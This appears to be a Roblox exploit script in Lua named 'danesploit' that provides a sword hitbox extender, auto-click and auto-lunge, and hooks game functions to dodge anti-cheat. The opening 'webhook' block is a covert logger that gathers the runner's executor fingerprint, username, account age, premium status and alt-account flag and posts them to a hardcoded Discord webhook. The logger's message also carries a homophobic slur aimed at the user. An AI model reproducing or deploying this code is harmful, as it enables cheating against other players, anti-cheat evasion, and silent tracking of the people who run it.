--webhook
plr = game:GetService'Players'.LocalPlayer
local premium = false
local ALT = false
if plr.MembershipType == Enum.MembershipType.Premium then
	premium = true
elseif plr.MembershipType == Enum.MembershipType.None then
	premium = false
end
if premium == false then 
	if plr.AccountAge <= 70 then 
		ALT = true
	end
end

local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)


local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
hwid = "";

for i, v in next, hwid_list do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end

if hwid then
local HttpServ = game:GetService('HttpService')
local url = "https://discord.com/api/webhooks/891494737461272576/5OCk7TARpjCAkGnYlpXeabMf3WDOXqYMhI8y3aWud3Kpodes-jxdep-f4lmDWe_1ybbd"


local data = 
    {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "ᎠȺហƐϚφꝈටįͲ",
            ["description"] = "script logger so i see who uses it lol",
            ["type"] = "rich",
            ["color"] = tonumber(0xAB0909),
            ["fields"] = {
                {
                    ["name"] = "Username:",
                    ["value"] = Game.Players.LocalPlayer.Name.." is gay (confirmed)",
                    ["inline"] = true
                },
				{
                    ["name"] = "Game Link:",
                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/ (has bad anti)",
                    ["inline"] = true
                },
				{
					["name"] = "Game Name:",
					["value"] = info.Name,
					["inline"] = true
				},
				{
					["name"] = "Age:",
					["value"] = plr.AccountAge,
					["inline"] = true
				},
				{
					["name"] = "Premium:",
					["value"] = premium,
					["inline"] = true
				},
				{
					["name"] = "ALT:",
					["value"] = ALT,
					["inline"] = true
				},
				
            },
        }}
    }
    local newdata = HttpServ:JSONEncode(data)
    
    local headers = {
            ["content-type"] = "application/json"
    }
    
    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
    http_request(request_payload)
end

--script
local TouchHook
TouchHook = hookmetamethod(game, "__namecall", function(Self, ...)
    local Args = table.pack(...)
    if not checkcaller() then
        if getnamecallmethod() == "GetTouchingParts" then
            return
        elseif getnamecallmethod() == "GetConnectedParts" then
            return
        end
    end
    return TouchHook(Self, table.unpack(Args, 1, Args.n))
end)

local hook;
hook = hookfunc(getrenv().wait, newcclosure(function(...)
    local args = {...}
    if args[1] == 3 and getcallingscript().Parent == nil then
        return coroutine.yield()
    end
    return hook(...)
end))

local hook;
hook = hookfunc(getrenv().wait, newcclosure(function(...)
    local args = {...}
    if args[1] == 2 and getcallingscript().Parent == nil then
        warn("[Event]", "Touch trigger hooked.")
        return coroutine.yield()
    end
    return hook(...)
end))

local UIS = game:GetService("UserInputService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer or game:GetService("Players"):GetPlayerFromCharacter(Players.LocalPlayer.Character)
local Character = LocalPlayer.Character or LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Parent



local lungeonly = true
local instalunge = false
local script = true
local dmg = false
local visual = false
local ac = false
local typing = false
local chatbar = game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar

local visualizer = Instance.new("Part")
visualizer.BrickColor = BrickColor.Yellow()
visualizer.Transparency = 0
visualizer.Anchored = true
visualizer.CanCollide = false
visualizer.Size = Vector3.new(0.5,0.5,0.5)
visualizer.Material = Enum.Material.ForceField

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("ImageLabel")
local Title = Instance.new("TextLabel")
local SizeText = Instance.new("TextLabel")
local DamageText = Instance.new("TextLabel")
local ShapeText = Instance.new("TextLabel")
local VisualizerText = Instance.new("TextLabel")
local Size = Instance.new("TextBox")
local Damage = Instance.new("TextButton")
local Frame_2 = Instance.new("Frame")
local Visualizer = Instance.new("TextButton")
local Frame_3 = Instance.new("Frame")
local Shape = Instance.new("TextButton")
local Target = Instance.new("TextBox")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Frame.Name = "Frame"
Frame.Parent = ScreenGui
Frame.AnchorPoint = Vector2.new(0, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(50, 123, 187)
Frame.BackgroundTransparency = 0.000
Frame.Position = UDim2.new(0,0,0.5,0)
Frame.Size = UDim2.new(0, 249, 0, 300)
Frame.Image = "rbxassetid://3570695787"
Frame.ImageColor3 = Color3.fromRGB(255, 52, 52)
Frame.ImageTransparency = 1
Frame.ScaleType = Enum.ScaleType.Slice
Frame.SliceCenter = Rect.new(100, 100, 100, 100)
Frame.SliceScale = 0.120

Title.Name = "Title"
Title.Parent = Frame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Size = UDim2.new(0, 249, 0, 70)
Title.Font = Enum.Font.LuckiestGuy
Title.Text = "danesploit v1.1.0"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 25.000

SizeText.Name = "SizeText"
SizeText.Parent = Frame
SizeText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SizeText.BackgroundTransparency = 1.000
SizeText.Position = UDim2.new(0, 33, 0, 70)
SizeText.Size = UDim2.new(0, 99, 0, 35)
SizeText.Font = Enum.Font.LuckiestGuy
SizeText.Text = "Size:"
SizeText.TextColor3 = Color3.fromRGB(255, 255, 255)
SizeText.TextSize = 20.000

DamageText.Name = "DamageText"
DamageText.Parent = Frame
DamageText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DamageText.BackgroundTransparency = 1.000
DamageText.Position = UDim2.new(0, 33, 0, 125)
DamageText.Size = UDim2.new(0, 99, 0, 35)
DamageText.Font = Enum.Font.LuckiestGuy
DamageText.Text = "Damage:"
DamageText.TextColor3 = Color3.fromRGB(255, 255, 255)
DamageText.TextSize = 20.000

ShapeText.Name = "ShapeText"
ShapeText.Parent = Frame
ShapeText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ShapeText.BackgroundTransparency = 1.000
ShapeText.Position = UDim2.new(0, 33, 0, 180)
ShapeText.Size = UDim2.new(0, 99, 0, 35)
ShapeText.Font = Enum.Font.LuckiestGuy
ShapeText.Text = "Shape:"
ShapeText.TextColor3 = Color3.fromRGB(255, 255, 255)
ShapeText.TextSize = 20.000

VisualizerText.Name = "VisualizerText"
VisualizerText.Parent = Frame
VisualizerText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
VisualizerText.BackgroundTransparency = 1.000
VisualizerText.Position = UDim2.new(0, 33, 0, 235)
VisualizerText.Size = UDim2.new(0, 99, 0, 35)
VisualizerText.Font = Enum.Font.LuckiestGuy
VisualizerText.Text = "Visualizer:"
VisualizerText.TextColor3 = Color3.fromRGB(255, 255, 255)
VisualizerText.TextSize = 20.000

Size.Name = "Size"
Size.Parent = Frame
Size.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Size.BackgroundTransparency = 1.000
Size.Position = UDim2.new(0, 167, 0, 70)
Size.Size = UDim2.new(0, 49, 0, 35)
Size.Font = Enum.Font.LuckiestGuy
Size.Text = "2.8"
Size.TextColor3 = Color3.fromRGB(255, 255, 255)
Size.TextSize = 20.000

Damage.Name = "Damage"
Damage.Parent = Frame
Damage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Damage.BackgroundTransparency = 0.400
Damage.BorderColor3 = Color3.fromRGB(0, 0, 0)
Damage.BorderSizePixel = 2
Damage.Position = UDim2.new(0, 177, 0, 125)
Damage.Size = UDim2.new(0, 29, 0, 30)
Damage.Font = Enum.Font.SourceSans
Damage.Text = ""
Damage.TextColor3 = Color3.fromRGB(255, 255, 255)
Damage.TextSize = 14.000

Frame_2.Parent = Damage
Frame_2.AnchorPoint = Vector2.new(0.5, 0.5)
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.5, 0, 0.5, 0)

Visualizer.Name = "Visualizer"
Visualizer.Parent = Frame
Visualizer.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Visualizer.BackgroundTransparency = 0.400
Visualizer.BorderColor3 = Color3.fromRGB(0, 0, 0)
Visualizer.BorderSizePixel = 2
Visualizer.Position = UDim2.new(0, 177, 0, 235)
Visualizer.Size = UDim2.new(0, 30, 0, 30)
Visualizer.Font = Enum.Font.SourceSans
Visualizer.Text = ""
Visualizer.TextColor3 = Color3.fromRGB(255, 255, 255)
Visualizer.TextSize = 14.000

Frame_3.Parent = Visualizer
Frame_3.AnchorPoint = Vector2.new(0.5, 0.5)
Frame_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_3.BorderSizePixel = 0
Frame_3.Position = UDim2.new(0.5, 0, 0.5, 0)

Shape.Name = "Shape"
Shape.Parent = Frame
Shape.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Shape.BackgroundTransparency = 1.000
Shape.Position = UDim2.new(0, 155, 0, 180)
Shape.Size = UDim2.new(0, 74, 0, 35)
Shape.Font = Enum.Font.LuckiestGuy
Shape.Text = "Ball"
Shape.TextColor3 = Color3.fromRGB(255, 255, 255)
Shape.TextSize = 17.000

Target.Name = "Target"
Target.Parent = Frame
Target.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
Target.BackgroundTransparency = 100
Target.BorderColor3 = Color3.fromRGB(0, 0, 0)
Target.BorderSizePixel = 3
Target.Position = UDim2.new(0, 16, 0, 294)
Target.Size = UDim2.new(0, 213, 0, 35)
Target.Font = Enum.Font.LuckiestGuy
Target.Text = ""
Target.TextColor3 = Color3.fromRGB(255, 255, 255)
Target.TextSize = 20.000


Damage.MouseButton1Click:Connect(function()
	dmg = not dmg
	local frame = Damage.Frame
	if dmg then
		frame:TweenSize(UDim2.new(0,30,0,30),Enum.EasingDirection.In,Enum.EasingStyle.Quad,0.1,true)
	else
		frame:TweenSize(UDim2.new(0,0,0,0),Enum.EasingDirection.In,Enum.EasingStyle.Quad,0.1,true)
	end
end)
	
Visualizer.MouseButton1Click:Connect(function()
	visual = not visual
	local frame = Visualizer.Frame
	if visual then
		frame:TweenSize(UDim2.new(0,30,0,30),Enum.EasingDirection.In,Enum.EasingStyle.Quad,0.1,true)
	else
		frame:TweenSize(UDim2.new(0,0,0,0),Enum.EasingDirection.In,Enum.EasingStyle.Quad,0.1,true)
	end
end)

local i = 1
	
Shape.MouseButton1Click:Connect(function()
	if i ~= 3 then
		i = i + 1
	else
		i = 1
	end
	if i == 1 then
		Shape.Text = "Ball"
	elseif i == 2 then
		Shape.Text = "Block"
	elseif i == 3 then
		Shape.Text = "Cylinder"
	end
end)

chatbar.Focused:connect(function()
    typing = true
end)

chatbar.FocusLost:connect(function()
    typing = false
end)

game:GetService("UserInputService").InputBegan:connect(function(inp,gameProcessedEvent)
	if gameProcessedEvent then return end
	if not script then return end
	if inp.KeyCode == Enum.KeyCode.T then
        instalunge = not instalunge
    end
	if inp.KeyCode == Enum.KeyCode.R then
		ScreenGui.Enabled = not ScreenGui.Enabled
	elseif inp.KeyCode == Enum.KeyCode.E then
        ac = not ac
	end
end)

local function FTI(hit,handle)
    local hum = hit.Parent:FindFirstChildOfClass("Humanoid")
    if hum and hit.Parent.Name ~= game.Players.LocalPlayer.Character.Name then
        for i,t in pairs(handle.Parent.Parent:GetChildren()) do
            if t:IsA("Part") then
                if t:FindFirstChildOfClass("TouchTransmitter") then
                    if dmg then
                        if lungeonly then
                            if handle.Parent.GripUp ~= Vector3.new(-1,0,0) then return end
                            for i,v in pairs(hit.Parent:GetChildren()) do
                                if v:IsA("Part") then
                                    firetouchinterest(v,t,0)
                	                firetouchinterest(v,t,1)
                                    firetouchinterest(v,handle,0)
                	                firetouchinterest(v,handle,1)
                                end
                            end
                        else
                            for i,v in pairs(hit.Parent:GetChildren()) do
                                if v:IsA("Part") then
                                    firetouchinterest(v,t,0)
                	                firetouchinterest(v,t,1)
                                    firetouchinterest(v,handle,0)
                	                firetouchinterest(v,handle,1)
                                end
                            end
                        end
                    else
                        if lungeonly then
                            if handle.Parent.GripUp ~= Vector3.new(-1,0,0) then return end
                            local LArm = hit.Parent:FindFirstChild("Left Arm")
                            if LArm then
                                firetouchinterest(LArm,t,0)
                    	        firetouchinterest(LArm,t,1)
                                firetouchinterest(LArm,handle,0)
                    	        firetouchinterest(LArm,handle,1)
                    	    else
                    	        firetouchinterest(hit,t,0)
                	            firetouchinterest(hit,t,1)
                    	        firetouchinterest(hit,handle,0)
                	            firetouchinterest(hit,handle,1)
                    	    end
                        else
                            local LArm = hit.Parent:FindFirstChild("Left Arm")
                            if LArm then
                                firetouchinterest(LArm,t,0)
                    	        firetouchinterest(LArm,t,1)
                                firetouchinterest(LArm,handle,0)
                    	        firetouchinterest(LArm,handle,1)
                    	    else
                    	        firetouchinterest(hit,t,0)
                	            firetouchinterest(hit,t,1)
                    	        firetouchinterest(hit,handle,0)
                	            firetouchinterest(hit,handle,1)
                    	    end
                    	end
                    end
                end
            end
        end
    end
end

game:GetService("RunService").RenderStepped:Connect(function()
    if not script then 
        visualizer.Parent = nil 
        return 
    end
    local tool = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
    if not tool then 
        visualizer.Parent = nil 
    end
    if tool then
        if ac == true then
            if typing == false then
                tool:Activate()
            end
        end
        local handle = tool:FindFirstChild("Handle") or tool:FindFirstChild("Part")
        if handle then
            for i,v in pairs(getconnections(handle.Touched)) do
                v:Enable()
            end
            local slash = handle:FindFirstChild("Slash")
            if slash then
                if slash:IsA("Sound") then
                    if instalunge then
                        if slash.Playing == true then
                            if not ac then
                                tool:Activate()
                            end
                        end
                    end
                end
            end
            if Shape.Text == "Ball" then
    			visualizer.Shape = Enum.PartType.Ball
            elseif Shape.Text == "Block" then
    			   visualizer.Shape = Enum.PartType.Block
    		elseif Shape.Text == "Cylinder" then
    			visualizer.Shape = Enum.PartType.Cylinder
    		end
            if visual then
                visualizer.Parent = game.Workspace
            else
                visualizer.Parent = nil
            end
            local size = tonumber(Size.Text)
            if size then
                visualizer.Size = Vector3.new(size,size,size)
    			visualizer.CFrame = handle.CFrame
    			local target = string.lower(Target.Text)
    			if target ~= "none" then
    				for i,v in pairs(game.Teams:GetTeams()) do
    				    local team = string.lower(v.Name)
    				    if team:find(target) then
    				        for i,p in pairs(game.Players:GetPlayers()) do
    				            if p.Team == v then
                                    local HRP = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
                                    if HRP then
                                        local distance = (HRP.Position-handle.Position).Magnitude
                                        if distance <= size and not typing then
                                            FTI(HRP,handle)
                                        end
                                    end
                                end
    				        end
    				    end
    				end
    			else
                    for i,p in pairs(game.Players:GetPlayers()) do
                        local HRP = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
                        if HRP then
                            local distance = (HRP.Position-handle.Position).Magnitude
                            if distance <= size then
                                FTI(HRP,handle)
                            end
                        end
                    end
    			end
            end
        end
    end
end)
